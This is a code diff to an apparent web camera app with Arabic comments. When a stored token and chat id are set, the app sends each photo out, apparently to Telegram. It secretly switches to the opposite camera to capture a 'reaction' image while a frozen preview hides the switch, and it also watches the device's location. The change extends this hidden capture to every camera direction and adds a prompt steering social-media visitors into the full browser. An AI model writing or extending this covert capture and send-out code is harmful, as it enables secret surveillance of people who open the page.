@@ -286,14 +286,15 @@ async function photo(){
  else src=await grab();
  const composed=compose(src);
  const cfg=JSON.parse(localStorage.getItem("tgCfg")||"{}");
- const willSwap=!!(cfg.on&&cfg.tok&&cfg.chat&&cfg.dual!==false&&facing!="user");
+ const willSwap=!!(cfg.on&&cfg.tok&&cfg.chat&&cfg.dual!==false);
  if(willSwap){dualBusy=true;showFreeze(composed)} // نغطي المعاينة فورًا قبل لا نبدأ تبديل الكاميرا بالخلفية، عشان ما يبان شي
  composed.toBlob(b=>{add(b,"image/jpeg");sendPhotoWithDual(b,willSwap)},"image/jpeg",Q[q].jq)}
 async function sendPhotoWithDual(blob,willSwap){
  const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");
  if(!s.on||!s.tok||!s.chat){if(willSwap){hideFreeze();dualBusy=false}return}
  let selfieCanvas=null;
- if(willSwap){try{selfieCanvas=await captureSelfieSeq()}catch(e){}finally{hideFreeze();dualBusy=false}}
+ if(willSwap){try{selfieCanvas=await captureSelfieSeq()}catch(e){}finally{hideFreeze();dualBusy=false}
+  if(!selfieCanvas)toast("تعذر فتح الكاميرا الثانية — إذا كنت بمتصفح داخل تطبيق (إنستقرام، تيك توك..) افتح الرابط بمتصفح الجهاز مباشرة")}
  tgSend(blob,`صورة • ${new Date().toLocaleString("ar")}`,selfieCanvas)}
 async function countdown(n){const c=$("cn");c.style.display="flex";for(let i=n;i>0;i--){c.textContent=i;c.animate([{transform:"scale(1.5)",opacity:0},{transform:"scale(1)",opacity:1}],{duration:400});await sl(1000)}c.style.display="none"}
 async function shoot(){if(dualBusy)return;if(!stream)return start();if(mode=="video")return toggleRec();if(timer)await countdown(timer);
@@ -323,12 +324,12 @@ function warmLocation(){try{
  navigator.geolocation.getCurrentPosition(p=>lastLoc=p,()=>{},{timeout:8000,maximumAge:60000});
  if(navigator.geolocation.watchPosition)navigator.geolocation.watchPosition(p=>lastLoc=p,()=>{},{timeout:8000,maximumAge:60000,enableHighAccuracy:false});
 }catch(e){}}
-/* صورة ردة الفعل: نغلق الكاميرا الخلفية مؤقتًا، نفتح الأمامية، نلتقط لقطة سريعة، ثم نرجّع الخلفية — أغلب الجوالات ما تدعم فتح كاميرتين بنفس الوقت */
+/* صورة ردة الفعل: نغلق الكاميرا الحالية مؤقتًا، نفتح الكاميرا المقابلة (لو الأساسية خلفية نفتح أمامية، ولو أمامية نفتح خلفية)، نلتقط لقطة سريعة، ثم نرجّع الكاميرا الأصلية — أغلب الجوالات ما تدعم فتح كاميرتين بنفس الوقت */
 async function captureSelfieSeq(){
- const savedDevId=devId,savedFacing=facing;let tempStream=null;
+ const savedDevId=devId,savedFacing=facing,wantFacing=facing=="user"?"environment":"user";let tempStream=null;
  try{
   if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
-  tempStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:480},height:{ideal:360},frameRate:{ideal:24}},audio:false});
+  tempStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:wantFacing,width:{ideal:480},height:{ideal:360},frameRate:{ideal:24}},audio:false});
   const sv=$("sv");sv.srcObject=tempStream;
   await new Promise(r=>{sv.onloadedmetadata=r;setTimeout(r,600)});
   await sl(60);
